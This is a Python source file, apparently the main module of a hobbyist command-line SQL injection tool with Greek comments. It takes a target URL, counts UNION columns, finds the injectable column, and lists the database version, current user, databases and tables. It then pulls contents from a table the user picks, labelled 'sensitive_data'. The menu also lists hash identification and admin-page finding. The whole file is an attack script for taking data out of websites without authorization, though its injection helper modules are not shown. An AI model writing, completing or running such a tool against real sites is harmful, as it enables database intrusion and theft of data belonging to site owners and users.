import s_data
import dbs
import replaces
import binascii
import sys
from prints import *
from requests import *
from find_total_cols import ft_cols, uni_cols
from vulnerable import vuln, f_vuln_col
from response import site_alive
from search_in_columns import search_in_columns


class InjectDatabase:

    def __init__(self, site, vuln_param):
        # the first param, $ python main.py site.com
        self.site = site
        self.back_up_site = site
        self.vuln_param = vuln_param
        self.columns = None
        self.vuln_column = None
        self.db_version = None
        self.db_user = None
        self.db_names = None
        self.working_on_db = None
        self.the_page = None
        self.tables = None
        self.based = None
        self.table_choose = None
        self.sensitive_data = None

    def total_columns(self):
        self.columns, self.based = ft_cols(self.site)
        self.site = uni_cols(self.site, self.columns, self.based)
        self.site = self.site.replace(self.vuln_param, self.vuln_param + '-')

    def vulnerable_column(self):
        self.vuln_column = str(f_vuln_col(self.site, self.columns))
        self.site = replaces.repl(self.site, 1, self.vuln_column)

    def database_information(self):
        self.db_version = dbs.version(self.site)
        print("SQL Version: %s" % self.db_version)

        self.db_user = dbs.user(self.site)
        print("Current user is: %s" % self.db_user)

        self.db_names = dbs.names(self.site)
        print_data(self.db_names, ['Databases'])

        self.working_on_db = dbs.working_db(self.site)
        print("You are on: %s database" % self.working_on_db)

        change_database = input("Do you want to change database? (y/n): ")
        if change_database == "y":
            self.change_database()
        else:
            self.site = replaces.repl(self.site, 2, self.working_on_db)

    def find_tables_of_database(self):
        self.the_page = get_the_page(self.site, "2")
        self.tables = s_data.search_for(self.the_page)

        if not len(self.tables):
            print("Could not get the tables, program will exit.")
            exit()

        print_data(self.tables, ['Tables Found'])
        self.site = replaces.repl(self.site, 3, self.working_on_db)
        if not self.based == '':
            self.site = site.replace(self.based, '')

    def select_table(self):
        print("Give the table: ")
        self.table_choose = input(">>> ")
        while not(self.table_choose in self.tables):
            print("Wrong input. Give the table: ")
            self.table_choose = input(">>> ")

        self.table_choose = bytes(self.table_choose, encoding='utf-8')
        self.table_choose = binascii.hexlify(self.table_choose)
        self.table_choose = self.table_choose .decode()

    def search_data_from_columns(self):
        self.sensitive_data = search_in_columns(
            self.site, self.table_choose, self.based)

    # Prepei na to kanw etsi wste an metepeita 8elei na alla3ei o xrhsths database
    # na mporei na to kanei apo edw giati twra den ginete
    def change_database(self):
        print_data(self.db_names, ['Databases'])
        self.working_on_db = input(
            "On which Database you want to work on?: ")
        while self.working_on_db not in self.db_names:
            self.working_on_db = input("Wrong Input!\nOn which Database you want to work on?: ")

        self.site = replaces.repl(self.site, 2, self.working_on_db)

    # na diagrafei meta
    def option1(self):
        print(1)

    def option2(self):
        print(2)


if __name__ == '__main__':
    intro()
    option = 0

    while not option:
        print("1.| Inject DB from site.")
        print("2.| Hash ID.")
        print("3.| Find admin page.")
        option = input(">>> ")

    if option == "1":
        flag = 1

        while flag:
            # the first param given from terminal, $ python main.py site.com
            try:
                site = sys.argv[1]
            except IndexError:
                print('Enter a url to test:')
                site = input(">>> ")

            # Vazeis edw to url tou site pou einai eupa8es
            # site = "http://www.xxx.xxx/sql.php?id=1'"

            if "'" in site:
                site = site_alive(site)
                vuln_param = vuln(site)
                flag = 0
            else:
                print("Site doesn't look vulnerable")
                print("Enter url with ' :")
                site = input(">>> ")

        if not flag:
            find_data = InjectDatabase(site, vuln_param)
            find_data.total_columns()
            find_data.vulnerable_column()
            find_data.database_information()
            find_data.find_tables_of_database()
            find_data.select_table()
            find_data.search_data_from_columns()
            
    #  elif option == "2":
        #  prepei na vrw swsto onoma gia to arxeio.
        #  options.what_to_do("1")
